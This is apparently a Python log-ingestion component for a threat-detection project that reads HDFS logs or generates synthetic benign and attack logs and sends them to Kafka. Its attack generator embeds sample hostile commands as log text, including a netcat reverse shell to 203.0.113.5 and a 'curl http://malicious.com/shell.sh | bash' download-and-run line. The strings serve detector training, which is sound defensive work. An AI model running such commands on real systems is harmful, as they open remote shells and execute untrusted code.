"""
ThreatLens AI - Log Ingestion (Stage 1)
P2 Component: Reads system/application logs and sends to Kafka

Supports TWO modes:
1. Real data: HDFS logs dataset
2. Synthetic: Generated auth/system logs

Author: P2 Team
Handoff: Sends to P4's log anomaly detection models (RF + LSTM)
"""

import os
import sys
import json
import re
import time
import random
import uuid
from datetime import datetime, timedelta
from kafka import KafkaProducer
from typing import Dict, Optional, List
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class LogDataGenerator:
    """Generates synthetic system logs for testing"""
    
    USERS = ['admin', 'root', 'jenkins', 'webapp', 'dbuser', 'analyst']
    ATTACKERS = ['attacker', 'scanner', 'malicious_user']
    
    HOSTS = [
        'webserver-01', 'dbserver-01', 'appserver-01',
        'workstation-157', 'jumpbox-01', 'dc-01'
    ]
    
    SERVICES = ['sshd', 'sudo', 'systemd', 'httpd', 'mysqld', 'cron']
    
    LOG_TEMPLATES = {
        'ssh_success': "Accepted password for {user} from {src_ip} port {port} ssh2",
        'ssh_failed': "Failed password for {user} from {src_ip} port {port} ssh2",
        'sudo_success': "{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
        'sudo_failed': "{user} : command not allowed ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}",
        'service_start': "{service}.service: Started {service} service.",
        'service_stop': "{service}.service: Stopped {service} service.",
        'file_access': "File accessed: {file_path} by user {user}",
        'process_spawn': "Process {pid} ({process}) created by user {user}"
    }
    
    def generate_normal_log(self) -> Dict:
        """Generate a benign log entry"""
        log_type = random.choice([
            'ssh_success', 'sudo_success', 'service_start', 'file_access'
        ])
        
        user = random.choice(self.USERS)
        host = random.choice(self.HOSTS)
        service = random.choice(self.SERVICES)
        
        if log_type == 'ssh_success':
            message = self.LOG_TEMPLATES[log_type].format(
                user=user,
                src_ip=f"192.168.1.{random.randint(1, 254)}",
                port=random.randint(40000, 60000)
            )
            level = 'INFO'
            
        elif log_type == 'sudo_success':
            commands = ['/bin/systemctl status', '/usr/bin/tail /var/log/syslog', 
                       '/bin/ls -la /var/www']
            message = self.LOG_TEMPLATES[log_type].format(
                user=user,
                command=random.choice(commands)
            )
            level = 'INFO'
            
        elif log_type == 'service_start':
            message = self.LOG_TEMPLATES[log_type].format(service=service)
            level = 'INFO'
            
        else:  # file_access
            paths = ['/var/www/html/index.html', '/home/user/document.pdf', 
                    '/opt/app/config.yaml']
            message = self.LOG_TEMPLATES[log_type].format(
                file_path=random.choice(paths),
                user=user
            )
            level = 'DEBUG'
        
        return {
            'timestamp': datetime.utcnow(),
            'host': host,
            'service': service,
            'level': level,
            'user': user,
            'message': message,
            'src_ip': f"192.168.1.{random.randint(1, 254)}",
            'event_type': log_type
        }
    
    def generate_attack_log(self, attack_type: str = 'random') -> Dict:
        """Generate malicious log entry"""
        if attack_type == 'random':
            attack_type = random.choice([
                'brute_force', 'privilege_escalation', 'lateral_movement', 'persistence'
            ])
        
        host = random.choice(self.HOSTS)
        attacker = random.choice(self.ATTACKERS)
        
        if attack_type == 'brute_force':
            # Failed SSH login attempts
            message = self.LOG_TEMPLATES['ssh_failed'].format(
                user=random.choice(self.USERS),
                src_ip=f"203.0.113.{random.randint(1, 254)}",  # Suspicious external IP
                port=random.randint(50000, 60000)
            )
            level = 'WARNING'
            event_type = 'ssh_failed'
            
        elif attack_type == 'privilege_escalation':
            # Suspicious sudo commands
            suspicious_commands = [
                '/bin/bash',
                '/usr/bin/nc -e /bin/bash 203.0.113.5 4444',
                '/bin/chmod 4755 /tmp/exploit',
                'curl http://malicious.com/shell.sh | bash'
            ]
            message = self.LOG_TEMPLATES['sudo_failed'].format(
                user=attacker,
                command=random.choice(suspicious_commands)
            )
            level = 'ERROR'
            event_type = 'sudo_failed'
            
        elif attack_type == 'lateral_movement':
            # SSH from compromised host
            message = self.LOG_TEMPLATES['ssh_success'].format(
                user='root',
                src_ip='192.168.1.157',  # Compromised workstation
                port=random.randint(50000, 60000)
            )
            level = 'WARNING'
            event_type = 'ssh_success'
            
        else:  # persistence
            # Suspicious service
            message = self.LOG_TEMPLATES['service_start'].format(
                service='backdoor'
            )
            level = 'WARNING'
            event_type = 'service_start'
        
        return {
            'timestamp': datetime.utcnow(),
            'host': host,
            'service': random.choice(self.SERVICES),
            'level': level,
            'user': attacker if attack_type != 'lateral_movement' else 'root',
            'message': message,
            'src_ip': f"203.0.113.{random.randint(1, 254)}",
            'event_type': event_type
        }


class HDFSLogReader:
    """Reads HDFS log dataset and extracts structured data"""
    
    # HDFS log pattern: timestamp PID LEVEL component: message
    LOG_PATTERN = re.compile(
        r'^(\d{6}\s\d{6})\s+(\d+)\s+(\w+)\s+([^:]+):\s+(.+)$'
    )
    
    def __init__(self, file_path: str):
        self.file_path = file_path
        self.file_handle = None
    
    def open(self):
        """Open log file for reading"""
        try:
            self.file_handle = open(self.file_path, 'r')
            logger.info(f"Opened HDFS log file: {self.file_path}")
        except FileNotFoundError:
            logger.error(f"Log file not found: {self.file_path}")
            raise
    
    def read_batch(self, batch_size: int = 100) -> List[Dict]:
        """Read a batch of log entries"""
        if not self.file_handle:
            self.open()
        
        logs = []
        
        for i in range(batch_size):
            line = self.file_handle.readline()
            
            if not line:
                break  # EOF
            
            log_entry = self._parse_hdfs_log(line)
            if log_entry:
                logs.append(log_entry)
        
        logger.info(f"Read {len(logs)} log entries from HDFS dataset")
        return logs
    
    def _parse_hdfs_log(self, line: str) -> Optional[Dict]:
        """Parse HDFS log line into structured format"""
        match = self.LOG_PATTERN.match(line.strip())
        
        if not match:
            return None
        
        timestamp_str, pid, level, component, message = match.groups()
        
        # Convert timestamp (format: YYMMDD HHMMSS)
        try:
            timestamp = datetime.strptime(timestamp_str, '%y%m%d %H%M%S')
        except ValueError:
            timestamp = datetime.utcnow()
        
        return {
            'timestamp': timestamp,
            'host': 'hdfs-node',  # Simulated
            'service': component,
            'level': level,
            'user': 'hdfs',
            'message': message,
            'src_ip': '192.168.1.100',
            'event_type': 'hdfs_log',
            'pid': pid
        }
    
    def close(self):
        """Close log file"""
        if self.file_handle:
            self.file_handle.close()


class LogIngestion:
    """Main ingestion service for system logs"""
    
    def __init__(self,
                 kafka_broker: str = None,
                 dataset_path: str = None,
                 use_synthetic: bool = False):
        """
        Initialize log ingestion
        
        Args:
            kafka_broker: Kafka broker address
            dataset_path: Path to HDFS log file (if using real data)
            use_synthetic: Use synthetic log generator
        """
        self.kafka_broker = kafka_broker or os.getenv('KAFKA_BROKER', 'localhost:9092')
        self.dataset_path = dataset_path
        self.use_synthetic = use_synthetic
        
        # Initialize Kafka producer
        self.producer = self._create_producer()
        
        # Initialize data source
        if use_synthetic:
            self.data_generator = LogDataGenerator()
            logger.info("Using synthetic log data generator")
        elif dataset_path:
            self.dataset_reader = HDFSLogReader(dataset_path)
            logger.info(f"Using HDFS dataset: {dataset_path}")
        else:
            logger.error("No data source configured!")
            sys.exit(1)
    
    def _create_producer(self) -> KafkaProducer:
        """Create Kafka producer with JSON serialization"""
        return KafkaProducer(
            bootstrap_servers=self.kafka_broker,
            value_serializer=lambda v: json.dumps(v, default=str).encode('utf-8'),
            key_serializer=lambda k: k.encode('utf-8') if k else None,
            acks='all',
            retries=3
        )
    
    def create_event(self, log_data: Dict) -> Dict:
        """Create normalized log event"""
        return {
            'event_id': str(uuid.uuid4()),
            'timestamp': log_data['timestamp'].isoformat() + 'Z',
            'source_type': 'logs',
            'host': log_data['host'],
            'zone': 'network',  # Will be enriched later
            'raw_data': {
                'service': log_data['service'],
                'level': log_data['level'],
                'user': log_data['user'],
                'message': log_data['message'],
                'src_ip': log_data.get('src_ip', ''),
                'event_type': log_data.get('event_type', 'unknown')
            },
            'anomaly_score': 0.0,  # Will be set by P4's RF+LSTM models
            'severity': self._map_level_to_severity(log_data['level']),
            'dna_deviation_score': 0.0
        }
    
    def _map_level_to_severity(self, level: str) -> str:
        """Map log level to severity"""
        level_map = {
            'DEBUG': 'low',
            'INFO': 'low',
            'WARNING': 'medium',
            'ERROR': 'high',
            'CRITICAL': 'critical'
        }
        return level_map.get(level.upper(), 'low')
    
    def send_to_kafka(self, event: Dict, topic: str = 'raw-log-events'):
        """Send event to Kafka topic"""
        try:
            self.producer.send(
                topic,
                key=event['event_id'],
                value=event
            )
            self.producer.flush()
            return True
        except Exception as e:
            logger.error(f"Failed to send to Kafka: {e}")
            return False
    
    def run_synthetic_mode(self, events_per_batch: int = 10,
                          attack_ratio: float = 0.15,
                          interval_seconds: float = 1.0):
        """Run continuous synthetic log generation"""
        logger.info(f"Starting synthetic mode: {events_per_batch} logs/batch, "
                   f"{attack_ratio*100}% attacks")
        
        batch_count = 0
        total_sent = 0
        
        try:
            while True:
                batch_count += 1
                
                for i in range(events_per_batch):
                    # Generate attack or normal log
                    if random.random() < attack_ratio:
                        log_data = self.data_generator.generate_attack_log()
                    else:
                        log_data = self.data_generator.generate_normal_log()
                    
                    # Create and send event
                    event = self.create_event(log_data)
                    if self.send_to_kafka(event):
                        total_sent += 1
                
                logger.info(f"Batch {batch_count}: Sent {events_per_batch} logs "
                           f"(Total: {total_sent})")
                
                time.sleep(interval_seconds)
                
        except KeyboardInterrupt:
            logger.info(f"\nStopped. Total logs sent: {total_sent}")
            self.producer.close()
    
    def run_dataset_mode(self, batch_size: int = 100,
                        batches: int = 10,
                        interval_seconds: float = 1.0):
        """Run batch ingestion from HDFS dataset"""
        logger.info(f"Starting dataset mode: {batch_size} logs/batch, {batches} batches")
        
        total_sent = 0
        
        try:
            for batch_num in range(batches):
                # Read batch from dataset
                logs = self.dataset_reader.read_batch(batch_size)
                
                if not logs:
                    logger.warning("No more data in dataset")
                    break
                
                # Send each log
                for log_data in logs:
                    event = self.create_event(log_data)
                    if self.send_to_kafka(event):
                        total_sent += 1
                
                logger.info(f"Batch {batch_num + 1}/{batches}: Sent {len(logs)} logs "
                           f"(Total: {total_sent})")
                
                time.sleep(interval_seconds)
        
        except KeyboardInterrupt:
            logger.info(f"\nStopped. Total logs sent: {total_sent}")
        finally:
            if hasattr(self, 'dataset_reader'):
                self.dataset_reader.close()
            self.producer.close()


def main():
    """
    Main entry point for log ingestion
    
    Usage:
        # Synthetic mode
        python log_ingestion.py --mode synthetic --events 20 --attacks 0.2
        
        # Dataset mode (requires HDFS logs)
        python log_ingestion.py --mode dataset --path datasets/logs/hdfs/HDFS_2k.log
    """
    import argparse
    
    parser = argparse.ArgumentParser(description='ThreatLens Log Ingestion (P2)')
    parser.add_argument('--mode', choices=['synthetic', 'dataset'], required=True)
    parser.add_argument('--path', type=str, help='Path to HDFS log file')
    parser.add_argument('--kafka', type=str, default='localhost:9092')
    parser.add_argument('--events', type=int, default=10)
    parser.add_argument('--attacks', type=float, default=0.15)
    parser.add_argument('--batches', type=int, default=10)
    parser.add_argument('--interval', type=float, default=1.0)
    
    args = parser.parse_args()
    
    if args.mode == 'dataset' and not args.path:
        parser.error("--path required for dataset mode")
    
    ingestion = LogIngestion(
        kafka_broker=args.kafka,
        dataset_path=args.path,
        use_synthetic=(args.mode == 'synthetic')
    )
    
    if args.mode == 'synthetic':
        ingestion.run_synthetic_mode(
            events_per_batch=args.events,
            attack_ratio=args.attacks,
            interval_seconds=args.interval
        )
    else:
        ingestion.run_dataset_mode(
            batch_size=args.events,
            batches=args.batches,
            interval_seconds=args.interval
        )


if __name__ == '__main__':
    main()